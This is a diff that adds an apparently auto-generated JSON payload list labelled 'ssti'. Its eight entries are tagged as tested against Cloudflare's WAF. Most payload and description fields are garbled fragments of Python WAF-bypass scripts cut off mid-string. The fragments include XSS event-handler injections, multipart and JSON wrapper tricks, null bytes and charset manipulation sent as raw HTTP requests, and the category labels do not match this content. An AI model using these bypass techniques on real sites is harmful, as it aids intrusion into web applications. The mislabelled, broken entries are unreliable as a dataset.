@@ -1,0 +1,119 @@
+{
+  "category": "ssti",
+  "subcategory": "general",
+  "count": 8,
+  "payloads": [
+    {
+      "id": "ssti-0001",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "\n\" + \"=\" * 80)\nprint(\"44D: Template Literal Context — Backtick as JS Delimiter\")\nprint(\"=\" * 80 + \"\n\")\n\n# In JavaScript, backtick starts a template literal: `${expression}`\n# If the page reflects our input inside a JS context, backtick could escape\n# Test: does the page reflect in any JS context?\n\n# First, check where inputs are reflected\nr = requests.get(BASE, params={\"globalHtml\": \"MARKER_G_XYZ",
+      "description": "attributeHtml\": \"MARKER_A_XYZ\"},\n                verify=False, timeout=TIMEOUT)\ng_count = r.text.count(\"MARKER_G_XYZ",
+      "technique": "direct_injection",
+      "source_file": "waf_round44_browser_quirk.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0002",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "\", body_empty)\n\n# A10: Disrupted Content-Disposition in body\nfor xss in [XSS_SHORT, XSS]:\n    bound = \"dispbound\"\n    body_disp = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\"\n        f\"Content-Type: text/html\r\n\r\n\"\n        f\"{xss}\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode()\n    multipart_req(bound, body_disp)\n\n# A11: Header separator manipulation in body (\n instead of \r\n)\nfor xss in [XSS_SHORT, XSS]:\n    bound = \"sepbound\"\n    body_sep = (\n        f\"--{bound}\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\n\n\"\n        f\"{xss}\n\"\n        f\"--{bound}--\n\"\n    ).encode()\n    multipart_req(bound, body_sep)\n\n# A12: Multiple parts, XSS in later part\nbound = \"multipart123\"\nbody_multi = (\n    f\"--{bound}\r\n\"\n    f\"Content-Disposition: form-data; name=\\\"safe\\\"\r\n\r\n\"\n    f\"safe_value\r\n\"\n    f\"--{bound}\r\n\"\n    f\"Content-Disposition: form-data; name=\\\"also_safe\\\"\r\n\r\n\"\n    f\"also_safe\r\n\"\n    f\"--{bound}\r\n\"\n    f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n\"\n    f\"{XSS_SHORT}\r\n\"\n    f\"--{bound}--\r\n\"\n).encode()\nmultipart_req(bound, body_multi)\n\n# A13: Linefeed removal (no blank line between headers and body)\nfor xss in [XSS_SHORT]:\n    bound = \"lfbound\"\n    body_lf = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\"\n        f\"{xss}\r\n\"  # Missing blank line between header and value\n        f\"--{bound}--\r\n\"\n    ).encode()\n    multipart_req(bound, body_lf)\n\nprint(f\"  Multipart done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# B. JSON FIELD WRAPPER MANIPULATION (WAFFLED §6.3.3)\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- B: JSON Field Wrapper Manipulation ---\")\n\n# B1: Null byte between field name and colon\nfor xss in [XSS_SHORT, XSS]:\n    bodies = [\n        f'{{\"globalHtml\\x00\": \"{xss}\"}}',\n        f'{{\"\\x00globalHtml\": \"{xss}\"}}',\n        f'{{\"globalHtml\"\\x00: \"{xss}\"}}',\n    ]\n    for body_str in bodies:\n        body = body_str.encode('utf-8', errors='replace')\n        raw_req(\n            b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n            b\"Content-Type: application/json\r\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + body)\n\n# B2: Double quote replacement (single quotes, backticks, no quotes)\nfor xss in [XSS_SHORT]:\n    bodies = [\n        f\"{{'globalHtml': '{xss}'}}\",\n        f\"{{`globalHtml`: `{xss}`}}\",\n        f\"{{globalHtml: '{xss}'}}\",\n    ]\n    for body_str in bodies:\n        body = body_str.encode()\n        raw_req(\n            b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n            b\"Content-Type: application/json\r\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + body)\n\n# B3: Content-Type removal (no CT header with JSON body)\nfor xss in [XSS_SHORT, XSS]:\n    body = json.dumps({\"globalHtml\": xss}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + body)\n\n# B4: JSON with BOM (byte order mark)\nfor xss in [XSS_SHORT]:\n    body = b'\\xef\\xbb\\xbf' + json.dumps({\"globalHtml\": xss}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"Content-Type: application/json\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + body)\n\n# B5: JSON with comments (not valid JSON but some parsers accept)\nfor xss in [XSS_SHORT]:\n    bodies = [\n        f'/* comment */\n{{\"globalHtml\": \"{xss}\"}}',\n        f'{{\"globalHtml\": /* comment */ \"{xss}\"}}',\n        f'// comment\n{{\"globalHtml\": \"{xss}\"}}',\n    ]\n    for body_str in bodies:\n        body = body_str.encode()\n        raw_req(\n            b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n            b\"Content-Type: application/json\r\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + body)\n\n# B6: JSON with trailing comma\nfor xss in [XSS_SHORT]:\n    body = f'{{\"globalHtml\": \"{xss}\",}}'.encode()\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"Content-Type: application/json\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + body)\n\n# B7: JSON with duplicate keys (first vs last wins)\nfor xss in [XSS_SHORT]:\n    body = f'{{\"globalHtml\": \"safe",
+      "description": "globalHtml\": \"{xss}\"}}'.encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\n# B8: JSON5 / relaxed JSON\nfor xss in [XSS_SHORT]:\n    bodies = [\n        f\"{{globalHtml: '{xss}'}}\",  # unquoted keys\n        f'{{\"globalHtml\": \\'{xss}\\'}}'.encode(),  # single quoted value\n    ]\n\n# B9: Content-Type parameter manipulation\nCT_VARIANTS = [\n    'application/json; charset=utf-8',\n    'application/json; charset=UTF-8',\n    'application/json; charset=utf-16',\n    'application/json; charset=utf-32',\n    'application/json; charset=iso-8859-1',\n    'application/json;charset=utf-8',\n    'APPLICATION/JSON',\n    'application/JSON',\n    'text/json',\n    'text/x-json',\n    'application/vnd.api+json',\n    'application/ld+json',\n    'application/hal+json',\n    'application/json-patch+json',\n    'application/merge-patch+json',\n]\n\nfor ct in CT_VARIANTS:\n    body = json.dumps({\"globalHtml\": XSS_SHORT}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\nprint(f\"  JSON done: {total} total",
+      "technique": "encoding",
+      "source_file": "waf_round81_waffled.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0003",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "(')[0] in lower if '(' in func else func.lower() in lower\n            mark = \"\"\n            if has_event and has_func:\n                mark = \" *** REFLECTED ***\"\n                found.append(f\"on{{focus={func}\")\n            elif not blocked:\n                mark = \" pass (check reflection)\"\n            print(f\"  on{{focus={func:35s}  HTTP {r.status_code}{mark}\")\n        else:\n            pass  # Don't print blocks to save space\n    except:\n        pass\n    time.sleep(0.1)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"45C: Test print() with REAL Event Handlers (No Gap)\")\nprint(\"=\" * 80)\n\n# Is it print() that's special, not the gap?\nreal_events_print = {\n    \"onfocus-print-POST\": '\" onfocus=print() autofocus x=\"",
+      "description": "onclick-print-POST\": '\" onclick=print() x=\"',\n    \"onload-print-POST\": '\" onload=print() x=\"',\n    \"onerror-print-POST\": '\" onerror=print() x=\"',\n    \"onmouseover-print-POST\": '\" onmouseover=print() x=\"',\n    \"ontoggle-print-POST\": '\" ontoggle=print() x=\"',\n    \n    # GET versions\n    \"onfocus-print-GET\": '\" onfocus=print() autofocus x=\"',\n    \"onclick-print-GET\": '\" onclick=print() x=\"',\n}\n\nfor name, payload in real_events_print.items():\n    method = \"POST\" if \"POST\" in name else \"GET\"\n    try:\n        if method == \"POST\":\n            r = requests.post(BASE, data={\"attributeHtml\": payload},\n                             verify=False, timeout=TIMEOUT)\n        else:\n            r = requests.get(BASE, params={\"attributeHtml\": payload},\n                            verify=False, timeout=TIMEOUT)\n        blocked = r.status_code in (403, 406, 503)\n        mark = \" PASS\" if not blocked else \" BLOCK\"\n        if not blocked and 'onfocus=' in r.text.lower():\n            mark = \" *** REAL EVENT + PRINT REFLECTED ***\"\n            found.append(name)\n        print(f\"  {name:40s} HTTP {r.status_code}{mark}",
+      "technique": "direct_injection",
+      "source_file": "waf_round45_print_verify.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0004",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "`${1}`",
+      "description": "tmpl-expr",
+      "technique": "direct_injection",
+      "source_file": "waf_round67_value_brute.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0005",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "`${name}`",
+      "description": "tmpl-name",
+      "technique": "direct_injection",
+      "source_file": "waf_round67_value_brute.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0006",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "utf-8', errors='replace'), label=\"urlenc-edge\")\n\n# C2: Multipart edge cases\nfor xss in [XSS_S, XSS_IMG]:\n    # Boundary with maximum length (70 chars per RFC)\n    long_bound = \"A\" * 70\n    multipart(long_bound, [(\"globalHtml\", xss, \"\")], label=\"long-boundary\")\n    \n    # Boundary with minimum (1 char)\n    multipart(\"x\", [(\"globalHtml\", xss, \"\")], label=\"short-boundary\")\n    \n    # Content-Disposition name with special chars\n    multipart(\"cdbound\", [(f'globalHtml\";injected=\"true', xss, \"\")], label=\"cd-inject\")\n    multipart(\"cdbound2\", [('globalHtml\\x00extra', xss, \"\")], label=\"cd-null\")\n    \n    # Content-Disposition with filename containing XSS\n    bound = \"fnbound\"\n    body = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"{xss}\\\"\r\n\"\n        f\"Content-Type: text/html\r\n\r\n\"\n        f\"{xss}\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode('utf-8', errors='replace')\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"filename-xss\")\n    \n    # Multiple Content-Disposition headers\n    bound = \"mcdbound\"\n    body = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"safe\\\"\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n\"\n        f\"{xss}\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode()\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"dup-cd\")\n    \n    # Preamble before first boundary (RFC allows)\n    bound = \"preamblebound\"\n    body = (\n        f\"This is the preamble and should be ignored\r\n\"\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n\"\n        f\"{xss}\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode()\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"preamble\")\n    \n    # Epilogue after final boundary\n    bound = \"epiloguebound\"\n    body = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n\"\n        f\"{xss}\r\n\"\n        f\"--{bound}--\r\n\"\n        f\"Epilogue text with {xss}\r\n\"\n    ).encode('utf-8', errors='replace')\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"epilogue\")\n\n# C3: JSON edge cases\nfor xss in [XSS_S, XSS_IMG]:\n    json_edges = [\n        # Unicode escapes in key\n        f'{{\"\\\\u0067\\\\u006c\\\\u006f\\\\u0062\\\\u0061\\\\u006c\\\\u0048\\\\u0074\\\\u006d\\\\u006c\": \"{xss}\"}}',\n        # Nested objects\n        f'{{\"a\":{{\"globalHtml\": \"{xss}\"}}}}',\n        # Array value\n        f'{{\"globalHtml\": [\"{xss}\"]}}',\n        # Number padding\n        f'{{\"globalHtml\": \"{xss}",
+      "description": "padding\": {\",\".join([\"0",
+      "technique": "direct_injection",
+      "source_file": "waf_round86_advanced.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0007",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "A\"*1000)}globalHtml\": \"{xss}\"}}',\n        # Whitespace abuse\n        f'  \t\n{{\"globalHtml\"  \t\n:  \t\n\"{xss}\"  \t\n}}  ',\n        # Escaped quotes in value\n        f'{{\"globalHtml\": \"{xss.replace(chr(34), chr(92)+chr(34))}\"}}',\n    ]\n    for jbody in json_edges:\n        post_raw(jbody.encode('utf-8', errors='replace'), ct=\"application/json\", label=\"json-edge\")\n\nprint(f\"  Grammar fuzzing done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# D. DIFFERENTIAL PARSING EXPLOITATION (Technique #10)\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- D: Differential Parsing ---\")\n\n# D1: URL-encoded with charset that changes parsing\nCHARSETS_DIFF = [\n    'charset=utf-7",
+      "description": "charset=utf-16', 'charset=utf-16le', 'charset=utf-16be',\n    'charset=utf-32', 'charset=utf-32le', 'charset=utf-32be',\n    'charset=iso-8859-1', 'charset=windows-1252', 'charset=shift_jis',\n    'charset=euc-jp', 'charset=iso-2022-jp', 'charset=big5',\n    'charset=gb2312', 'charset=gbk', 'charset=euc-kr',\n]\n\nfor cs in CHARSETS_DIFF:\n    for xss in [XSS_S]:\n        enc = urllib.parse.quote(xss, safe='",
+      "technique": "direct_injection",
+      "source_file": "waf_round86_advanced.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-0008",
+      "category": "ssti",
+      "subcategory": "general",
+      "payload": "{escaped}\"]}}',\n        # Multiple array items\n        f'{{\"globalHtml\":[\"safe",
+      "description": "{escaped}",
+      "technique": "direct_injection",
+      "source_file": "waf_round90_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
